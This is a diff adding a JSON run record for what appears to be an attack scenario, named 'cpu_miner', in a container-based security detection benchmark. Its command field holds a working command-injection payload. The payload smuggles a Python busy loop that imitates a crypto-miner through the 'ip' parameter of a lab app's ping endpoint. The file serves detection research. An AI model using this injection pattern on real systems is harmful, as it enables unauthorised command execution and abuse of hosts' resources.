@@ -1,0 +1,19 @@
+{
+  "scenario_id": "cpu_miner",
+  "kind": "attack",
+  "repeat_id": 3,
+  "driver_role": "attacker",
+  "driver_container_name": "drsec-bench-cpu_miner-r03-attacker",
+  "driver_container_id": "bede9dd856855b82dcafb7e64e0f77f65d28e462c007c2618f71bd22681c0961",
+  "target_container_id": "bf7c8d5067dd22ab618a704ee64e269df53cf2f3ef128568d72443d69f2d7d90",
+  "target_dsock_container_id": "f4153aa0c65b93b3ba9fe0d3ef5dacef7af29f9baf7217eb9058b02006693e88",
+  "c2_container_id": "e38b07fc5e2ab798c780ae1aaab3768e907a4f6f4ac41428549acfdccea6acd1",
+  "trace_out": "/home/yzx/DRSEC_v2/data/benchmarks/cpu_miner/repeat_03/trace.log",
+  "windows_dir": "/home/yzx/DRSEC_v2/data/benchmarks/cpu_miner/repeat_03/windows",
+  "metrics_path": "/home/yzx/DRSEC_v2/data/benchmarks/cpu_miner/repeat_03/metrics.json",
+  "window_seconds": 10,
+  "threshold": 0.5,
+  "max_windows": 0,
+  "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import time\\nt=time.time()+12\\nx=0\\nwhile time.time()<t:\\n x=(x*1664525+1013904223) & 0xFFFFFFFF\\nprint(\\\\\\'miner_done\\\\\\')')\\\"\" >/dev/null; sleep 2",
+  "duration_seconds": 18
+}
